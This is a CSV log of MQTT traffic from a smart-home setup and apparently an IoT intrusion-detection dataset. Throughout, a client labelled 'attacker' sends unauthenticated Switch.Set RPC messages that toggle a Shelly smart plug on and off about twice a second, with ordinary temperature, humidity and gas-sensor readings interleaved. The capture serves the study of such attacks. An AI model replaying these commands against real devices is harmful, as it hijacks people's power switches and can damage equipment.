2026-04-22T16:18:24,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33237.40,""swi"
2026-04-22T16:18:24,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3702 33237.423 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:25,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:25,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3703 33237.905 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:25,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:25,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33237.90,""swi"
2026-04-22T16:18:25,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3704 33237.921 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:25,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:25,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3705 33238.405 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:25,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:25,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33238.40,""swi"
2026-04-22T16:18:25,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3706 33238.424 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:26,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:26,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3707 33238.906 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:26,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:26,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33238.90,""swi"
2026-04-22T16:18:26,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3708 33238.922 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:18:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:18:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:18:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:18:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:18:26,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:26,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3709 33239.407 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:26,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:26,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33239.40,""swi"
2026-04-22T16:18:26,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3710 33239.425 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:27,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:27,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3711 33239.908 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:27,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:27,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33239.90,""swi"
2026-04-22T16:18:27,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3712 33239.924 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:27,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:27,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3713 33240.408 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:27,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:27,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33240.40,""swi"
2026-04-22T16:18:27,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3714 33240.427 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:28,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:28,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3715 33240.908 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:28,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:28,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33240.90,""swi"
2026-04-22T16:18:28,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3716 33240.924 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:28,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:28,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3717 33241.408 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:28,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:28,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33241.41,""swi"
2026-04-22T16:18:28,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3718 33241.427 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:29,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:29,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3719 33241.909 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:29,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:29,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33241.91,""swi"
2026-04-22T16:18:29,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3720 33241.925 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:29,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:29,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3721 33242.409 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:29,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:29,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33242.41,""swi"
2026-04-22T16:18:29,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3722 33242.427 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:30,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:30,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3723 33242.910 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:30,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:30,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33242.91,""swi"
2026-04-22T16:18:30,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3724 33242.926 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:30,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:30,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3725 33243.413 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:30,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:30,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33243.41,""swi"
2026-04-22T16:18:30,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3726 33243.432 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:31,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:31,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3727 33243.922 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:31,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:31,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33243.92,""swi"
2026-04-22T16:18:31,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3728 33243.938 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:31,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:31,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3729 33244.423 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:31,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:31,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33244.42,""swi"
2026-04-22T16:18:31,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3730 33244.442 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:32,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:32,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3731 33244.922 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:32,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:32,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33244.92,""swi"
2026-04-22T16:18:32,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3732 33244.939 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:32,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:32,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3733 33245.423 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:32,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:32,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33245.42,""swi"
2026-04-22T16:18:32,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3734 33245.442 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:33,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:33,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3735 33245.923 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:33,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:33,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33245.92,""swi"
2026-04-22T16:18:33,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3736 33245.940 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:33,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:33,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3737 33246.423 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:33,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:33,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33246.42,""swi"
2026-04-22T16:18:33,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3738 33246.442 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:34,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3739 33246.924 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33246.92,""swi"
2026-04-22T16:18:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3740 33246.940 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:34,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3741 33247.424 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33247.42,""swi"
2026-04-22T16:18:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3742 33247.443 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3743 33247.924 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33247.92,""swi"
2026-04-22T16:18:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3744 33247.941 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3745 33248.431 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33248.43,""swi"
2026-04-22T16:18:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3746 33248.450 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:36,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:36,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3747 33248.928 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:36,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:36,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33248.93,""swi"
2026-04-22T16:18:36,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3748 33248.945 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:18:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:18:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:18:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:18:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:18:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3749 33249.427 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33249.42,""swi"
2026-04-22T16:18:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3750 33249.445 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:37,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:37,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3751 33249.927 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:37,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:37,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33249.92,""swi"
2026-04-22T16:18:37,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3752 33249.943 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:37,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:37,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3753 33250.427 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
